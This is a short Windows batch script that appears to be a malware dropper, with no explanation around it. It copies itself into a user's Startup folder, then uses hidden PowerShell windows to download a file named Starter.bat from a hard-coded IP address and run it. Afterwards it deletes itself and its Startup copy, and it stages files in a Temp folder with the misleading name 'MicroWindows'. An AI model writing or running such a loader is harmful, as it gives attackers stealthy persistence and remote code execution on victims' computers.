@if (@CodeSection == @Batch) @then

@echo off
set "currentd=%cd%"
mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
set "targetd=C:\Users\%username%\AppData\Local\Temp\MicroWindows"
cd %targetd%
powershell -windowstyle hidden copy "%~f0" "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"

goto :Main

@end

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""%~f0""", 0, False
WScript.Quit

:Main
:LOOP
powershell -windowstyle hidden "Invoke-WebRequest -Uri http://34.88.221.44:9000/Starter.bat -OutFile Starter.bat"

if %errorlevel% equ 0 (
  start "" Starter.bat
  cd %currentd%
  del "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
  del "%~f0"
  exit /b
) else (
  ping -n 5 127.0.0.1 > nul 2>&1
  goto LOOP
)
exit /b